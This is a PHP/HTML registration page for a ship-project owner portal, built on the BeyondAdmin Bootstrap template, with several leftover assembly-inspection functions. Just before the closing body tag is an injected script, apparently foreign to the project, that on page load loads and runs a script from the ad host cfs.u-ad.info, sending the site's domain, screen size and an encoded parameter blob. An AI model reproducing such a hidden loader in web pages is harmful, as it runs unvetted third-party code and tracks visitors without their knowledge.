<!DOCTYPE html>
<!--
BeyondAdmin - Responsive Admin Dashboard Template build with Twitter Bootstrap 3.3.4
Version: 1.4.1
Purchase: http://wrapbootstrap.com
-->

<html xmlns="http://www.w3.org/1999/xhtml">
<!-- Head -->

<!-- Mirrored from beyondadmin-v1.4.1.s3-website-us-east-1.amazonaws.com/tables-data.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Aug 2015 01:26:21 GMT -->
<head>
    <meta charset="utf-8" />
    <title>Registrasi Pengguna</title>

    <meta name="description" content="data tables" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <link rel="shortcut icon" href="<?php echo base_url(); ?>assets/img/favicon.png" type="image/x-icon">

    <!--Basic Styles-->
    <link href="<?php echo base_url(); ?>assets/css/bootstrap.min.css" rel="stylesheet" />
    <link id="bootstrap-rtl-link" href="#" rel="stylesheet" />
    <link href="<?php echo base_url(); ?>assets/css/font-awesome.min.css" rel="stylesheet" />
    <link href="<?php echo base_url(); ?>assets/css/weather-icons.min.css" rel="stylesheet" />

    <!--Fonts-->
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300" rel="stylesheet" type="text/css">

    <!--Beyond styles-->
    <link href="<?php echo base_url(); ?>assets/css/beyond.min.css" rel="stylesheet" />
    <link href="<?php echo base_url(); ?>assets/css/demo.min.css" rel="stylesheet" />
    <link href="<?php echo base_url(); ?>assets/css/typicons.min.css" rel="stylesheet" />
    <link href="<?php echo base_url(); ?>assets/css/animate.min.css" rel="stylesheet" />
    <link href="<?php echo base_url(); ?>assets/css/jquery-ui.css" rel="stylesheet" />

    <link id="skin-link" href="#" rel="stylesheet" type="text/css" />

    <!--Page Related styles-->
    <script src="<?php echo base_url(); ?>assets/js/jquery.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/js/jquery-ui.js"></script>

    <link href="<?php echo base_url(); ?>assets/css/dataTables.bootstrap.css" rel="stylesheet" />

    <!--Skin Script: Place this script in head to load scripts for skins and rtl support-->
    <script src="<?php echo base_url(); ?>assets/js/skins.min.js"></script>
</head>
<!-- /Head -->
<!-- Body -->
<body onload="firstload()">
    <!-- Loading Container -->
    <div class="loading-container">
        <div class="loader"></div>
    </div>
    <!--  /Loading Container -->
    <!-- Navbar -->
    <div class="navbar">
        <div class="navbar-inner">
            <div class="navbar-container">
                <!-- Navbar Barnd -->
                <div class="navbar-header pull-left">
                    <a href="#" class="navbar-brand">
                        <small>
                            <img src="<?php echo base_url(); ?>assets/img/logos.png" alt="" />
                        </small>
                    </a>
                </div>
                <!-- /Navbar Barnd -->
                <!-- Sidebar Collapse -->
                <div class="sidebar-collapse" id="sidebar-collapse">
                    <i class="collapse-icon fa fa-bars"></i>
                </div>
                <!-- /Sidebar Collapse -->
                <!-- Account Area and Settings -->
                
            </div>
        </div>
    </div>
    <!-- /Navbar -->
    <!-- Main Container -->
    <div class="main-container container-fluid">
        <!-- Page Container -->
        <div class="page-container">
            <!-- Page Sidebar -->
             <div class="page-sidebar" id="sidebar">
                    <!-- Page Sidebar Header-->
                    
                    <!-- /Page Sidebar Header -->
                    <!-- Sidebar Menu -->
                    <ul class="nav sidebar-menu">
                        <!--Dashboard-->
                        <li>
                            <a href="<?php echo base_url(); ?>">
                                <i class="menu-icon glyphicon glyphicon-home"></i>
                                <span class="menu-text"> Home </span>
                            </a>
                        </li>
                        
                    </ul>
                    <!-- /Sidebar Menu -->
                </div>
            <div class="page-content">
                <!-- Page Breadcrumb -->
                <div class="page-breadcrumbs">
                    <ul class="breadcrumb">
                        <li>
                            <i class="fa fa-home"></i>
                            <a href="#">Home</a>
                        </li>
                      
                        <li class="active">Registrasi Pengguna</li>
                    </ul>
                </div>
                <!-- /Page Breadcrumb -->
                <!-- Page Header -->
                <div class="page-header position-relative">
                    <div class="header-title">
                        <h1>
                            Registrasi Pengguna
                            
                        </h1>
                    </div>
                    <!--Header Buttons-->
                    <div class="header-buttons">
                        <a class="sidebar-toggler" href="#">
                            <i class="fa fa-arrows-h"></i>
                        </a>
                        <a class="refresh" id="refresh-toggler" href="#">
                            <i class="glyphicon glyphicon-refresh"></i>
                        </a>
                        <a class="fullscreen" id="fullscreen-toggler" href="#">
                            <i class="glyphicon glyphicon-fullscreen"></i>
                        </a>
                    </div>
                    <!--Header Buttons End-->
                </div>
                <?php
                  if($hasil == 'sukses') { ?>
                    <br>
                    <div class="alert alert-success fade in" align="center">
                      <button class="close" data-dismiss="alert">
                          ×
                      </button>
                      <i class="fa-fw fa fa-check"></i>
                      <strong>Sukses</strong> Input Data Assembly Telah Berhasil
                    </div>
                  <?php } 
                  elseif ($hasil == 'gagal') { ?>
                    <br>
                    <div class="alert alert-danger fade in radius-bordered alert-shadowed">
                        <button class="close" data-dismiss="alert">
                            ×
                        </button>
                        <i class="fa-fw fa fa-times"></i>
                        <strong>Gagal!</strong> Input Data Assembly Gagal
                    </div>
                  <?php }
                ?>
                <div class="page-body">
                    
                    <div class="row">
                        <div class="col-xs-12 col-md-12">
                            <div class="widget">
                                <div class="widget-header ">
                                    <span class="widget-caption">Registrasi Pengguna</span>
                                    <div class="widget-buttons">
                                        <a href="#" data-toggle="maximize">
                                            <i class="fa fa-expand"></i>
                                        </a>
                                        <a href="#" data-toggle="collapse">
                                            <i class="fa fa-minus"></i>
                                        </a>
                                        <a href="#" data-toggle="dispose">
                                            <i class="fa fa-times"></i>
                                        </a>
                                    </div>
                                </div>
                                <div class="widget-body">
                                    
                                    <div id="horizontal-form">
                                                <form class="form-horizontal" method="post" role="form" enctype="multipart/form-data" action="<?php echo base_url(); ?>registrasi/submitregowner">
                                                                                                        
                                                    <br>
                                                    <div class="form-title" align="center">
                                                        Silahkan lengkapi form di bawah ini
                                                    </div>
                                                    <br>

                                                    <div class="form-group">
                                                        <label for="inputEmail3" class="col-sm-3 control-label no-padding-right">Username</label>
                                                        <div class="col-sm-6">
                                                            <input type="text" class="form-control" id="user" name="user" placeholder="Username">
                                                        </div>
                                                    </div>

                                                    <div class="form-group">
                                                        <label for="inputEmail3" class="col-sm-3 control-label no-padding-right">Password</label>
                                                        <div class="col-sm-6">
                                                            <input type="password" class="form-control" id="pass" name="pass" placeholder="Password">
                                                        </div>
                                                    </div>

                                                    <div class="form-group">
                                                        <label for="inputEmail3" class="col-sm-3 control-label no-padding-right">Nama Lengkap</label>
                                                        <div class="col-sm-6">
                                                            <input type="text" class="form-control" id="nama" name="nama" placeholder="Nama Lengkap">
                                                        </div>
                                                    </div>

                                                    <div class="form-group">
                                                        <label class="col-sm-3 control-label no-padding-right">Nomor Telepon</label>
                                                        <div class="col-sm-6">
                                                            <input type="number" class="form-control" id="telp" name="telp" placeholder="Nomor Telepon">
                                                        </div>
                                                    </div>

                                                    <div class="form-group">
                                                        <label for="inputEmail3" class="col-sm-3 control-label no-padding-right">Nama Perusahaan</label>
                                                        <div class="col-sm-6">
                                                            <input type="text" class="form-control" id="namaperusahaan" name="namaperusahaan" placeholder="Nama Perusahaan">     
                                                        </div>
                                                    </div>

                                                    <div class="form-group">
                                                        <label for="inputEmail3" class="col-sm-3 control-label no-padding-right">Alamat Perusahaan</label>
                                                        <div class="col-sm-6">
                                                            <input type="text" class="form-control" id="alamatpt" name="alamatpt" placeholder="Alamat Perusahaan">
                                                        </div>
                                                    </div>

                                                    <div class="form-group">
                                                        <label for="inputEmail3" class="col-sm-3 control-label no-padding-right">Tipe Kapal</label>
                                                        <div class="col-sm-6">
                                                            <input type="text" class="form-control" id="tipekapal" name="tipekapal" placeholder="Tipe Kapal">
                                                        </div>
                                                    </div>

                                                    <div class="form-group">
                                                        <label for="inputEmail3" class="col-sm-3 control-label no-padding-right">Nomor Project</label>
                                                        <div class="col-sm-6">
                                                            <input type="text" class="form-control" id="nopro" name="nopro" placeholder="Nomor Project">
                                                        </div>
                                                    </div>

                                                    <div class="form-group">
                                                        <label for="inputEmail3" class="col-sm-3 control-label no-padding-right">Pesan</label>
                                                        <div class="col-sm-6">
                                                            <input type="text" class="form-control" id="pesan" name="pesan" placeholder="Pesan">
                                                        </div>
                                                    </div>
                                                    
                                                   
                                                    

                                                     <div class="form-group">
                                                        <div class="col-lg-offset-5 col-lg-8">
                                                            <input class="btn btn-darkorange" type="reset" value="Reset" />
                                                            <input class="btn btn-palegreen" type="submit" onclick="submitval()" value="Simpan" id="tombol" />
                                                        </div>
                                                    </div>
                                                </form>
                                            </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                
                </div>
                

                <!-- /Page Body -->
            </div>
            <!-- /Page Content -->
        </div>
        <!-- /Page Container -->
        <!-- Main Container -->

    </div>

    <script type="text/javascript">

        var flag = 0;
        var dataleng;
        var itemlist = [];
        

        function firstload(){
            $.ajax({
                url: '<?php echo base_url(); ?>ajax/ambilprosesassembly/',
                data: {},
                dataType: 'json',
                type: 'POST',
                success: function(data) {
                    document.getElementById('proses').innerHTML = '<option value="null">--Silahkan Pilih--</option>';
                    for (var i = 0; i < data.length; i++) {
                        
                        $('#proses').append($('<option>', {
                            value: data[i].proses_assembly,
                            text: data[i].proses_assembly
                        }));
                        
                    };
                   
                    },
                })
          

        }

        function tampilproses(){        
            var proses = document.getElementById('proses').value;
            if (proses != "null") {
                $.ajax({
                url: '<?php echo base_url(); ?>ajax/ambilitemassembly/',
                data: {proses:proses},
                dataType: 'json',
                type: 'POST',
                success: function(data) {
                    dataleng = data.length;
                    document.getElementById('itemisi').innerHTML = '';
                    for (var i = 0; i < data.length; i++) {
                        var id1 = i + '1';
                        var id2 = i + '2';
                        itemlist[i] = data[i].item_assembly;
                        var isi = '<div class="form-group"><label class="col-sm-3 control-label no-padding-right">'+ data[i].item_assembly+'</label><div class="col-lg-3"><input type="'+data[i].tipe_dataassembly  +'" class="form-control" id="'+ id1 +'" placeholder="isi Item"></div><div class="col-lg-3"><input type="'+ data[i].tipe_dataassembly +'" class="form-control" id="'+ id2 +'" placeholder="Standard Item"></div></div>';
                        $('#itemisi').append(isi);
                        
                    };

                   
                   
                    },
                })
            }
            else{
                document.getElementById('itemisi').innerHTML = '';
            }
        }       

        function readURL(input) {
            if (input.files && input.files[0]) {
                var reader = new FileReader();

                reader.onload = function (e) {
                    $('#gambartampil')
                        .attr('src', e.target.result)
                        .width(110)
                        .height(110);
                };

                reader.readAsDataURL(input.files[0]);
            }
        }


        function submitval(){
            var daftarBarang = [];           

            for (var i = 0; i < dataleng; i++) {
                var barang = {};
                var id1 = i + '1';
                var id2 = i + '2';
               /* alert(id1);
                var aku = document.getElementById(id1).value;
                alert(aku);*/
                barang.nama = itemlist[i];
                barang.item = document.getElementById(id1).value;
                barang.standard = document.getElementById(id2).value;


                daftarBarang.push(barang);
                
            };
            //alert(JSON.stringify(daftarBarang));

            $('#daftarBarang').val(JSON.stringify(daftarBarang));

            $('#form').submit();

        
        }

        function pilihstatus () {
            var nilai = document.getElementById('status').value;

            if (nilai == "Reject") {
                document.getElementById('tenggang').style.display = 'block';
                document.getElementById('rein').style.display = 'block';
                document.getElementById('rekomendasi').style.display = 'block';
                document.getElementById('tenggang').innerHTML = '<label for="inputEmail3" class="col-sm-3 control-label no-padding-right">Tenggang Waktu</label><div class="col-sm-6"><input type="number" class="form-control" id="tenggangwaktu" name="tenggangwaktu" placeholder="Masukkan jumlah hari" onchange="tenggangw()"></div>';
                document.getElementById('rein').innerHTML = '<label for="inputEmail3" class="col-sm-3 control-label no-padding-right">Tanggal Re Inspeksi</label><div class="col-sm-6"><input type="text" class="form-control" id="reinspek1" name="reinspek1" disabled="true"><input type="hidden" class="form-control" id="reinspek" name="reinspek"></div>';
                document.getElementById('rekomendasi').innerHTML = '<label for="inputEmail3" class="col-sm-3 control-label no-padding-right">Rekomendasi</label><div class="col-sm-6"><textarea class="form-control" id="rekomendasi" name="rekomendasi" placeholder="Masukkan Rekomendasi"></textarea></div>';
            }
            else{
                document.getElementById('tenggang').innerHTML = '';
                document.getElementById('rein').innerHTML = '';
                document.getElementById('rekomendasi').innerHTML = '';
                document.getElementById('tenggang').style.display = 'none';
                document.getElementById('rein').style.display = 'none';
                document.getElementById('rekomendasi').style.display = 'none';
            }
        }

        function changeitem(){
            if(flag == 0){
                document.getElementById('isiitem').disabled = false;
                document.getElementById('standard').disabled = false;
                document.getElementById('tomboledit').className = "btn btn-palegreen";
                document.getElementById('tomboledit').value = "Selesai Edit";   
                $('#on').modal('show'); 
                flag = 1; 
            }
            else{
                document.getElementById('isiitem').disabled = true;
                document.getElementById('standard').disabled = true;
                document.getElementById('tomboledit').className = "btn btn-yellow";
                document.getElementById('tomboledit').value = "Edit";

                $('#off').modal('show'); 
                flag = 0;
            }
            
        }

        function tenggangw(){
            var d = new Date();
            var hari = parseInt(document.getElementById('tenggangwaktu').value);
            
            d.setDate(d.getDate() + hari);
            var tgl_kadaluarsa = d.getDate();
            var bulan_kadaluarsa = parseInt(d.getMonth()) + 1;
            var tahun_kadaluarsa = d.getFullYear();
            
            if (tgl_kadaluarsa < 10 ) {
                var tgl_kadaluarsa = '0'+tgl_kadaluarsa;
            }
            if (bulan_kadaluarsa < 10) {
                var bulan_kadaluarsa = '0'+bulan_kadaluarsa;
            }

            var tahun = tahun_kadaluarsa +'-'+ bulan_kadaluarsa+'-'+tgl_kadaluarsa;
            document.getElementById('reinspek').value = tahun;
            document.getElementById('reinspek1').value = tahun;
        }
    </script>

    <!--Basic Scripts-->
    
    <script src="<?php echo base_url(); ?>assets/js/bootstrap.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/js/slimscroll/jquery.slimscroll.min.js"></script>

    <!--Beyond Scripts-->
    <script src="<?php echo base_url(); ?>assets/js/beyond.min.js"></script>

    <!--Google Analytics::Demo Only-->
    <script>
        (function (i, s, o, g, r, a, m) {
            i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
                (i[r].q = i[r].q || []).push(arguments)
            }, i[r].l = 1 * new Date(); a = s.createElement(o),
            m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
        })(window, document, 'script', '../www.google-analytics.com/analytics.js', 'ga');

        ga('create', 'UA-60412744-1', 'auto');
        ga('send', 'pageview');

    </script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRXCgcW0TV1adfWybesYCEodciL3JGIsv7en13ce4hFDZ37M9jzZlJAtRS%2bZpGll%2bIXCtnYeSKxh9QKzEStTlDeBEjiavsHM6neKgrAaVFV0pes88%2bEh4d4EC9Qqrr9ZD2FFxIfiUBpmA%2fs%2bCCg%2f83Zugd4Ci4jN884S92MT6sz47DuFCfm2JCsK8D1nCbJ5AblOm1O7EalTfGY7wSVDY%2fAmcNIRrEOmWuw7Dy7EfCH%2fd70jyHZwGVzbz5KpmvgwPPPAvX6sR5UHEPs%2bEylKB5Y0EXwxRm2ImHg4cPppZRPlDd8komIvHUvSWN0mNdlHCJe2KCKg9L6Rnhtacs0tvoplwsba24M%2bUxrB3NTZVo2lIsRLqCp42IrDz8NOsl%2fHJYVYcU0DUw7cDpQKIgR8jkUwPFUCHNtzPZU6EDwOQkbUow9%2f4g8su2muTM78Fit7qPj1f8j%2bDYtSDG9VH6jHxJTXx82A5D7bpw4MMfZ4fj45PcTVGBYnIRL6iMG4SbRKqXHBNdS7a1X%2fdOapMkRUHeeA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
<!--  /Body -->

<!-- Mirrored from beyondadmin-v1.4.1.s3-website-us-east-1.amazonaws.com/tables-data.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Aug 2015 01:26:29 GMT -->
</html>
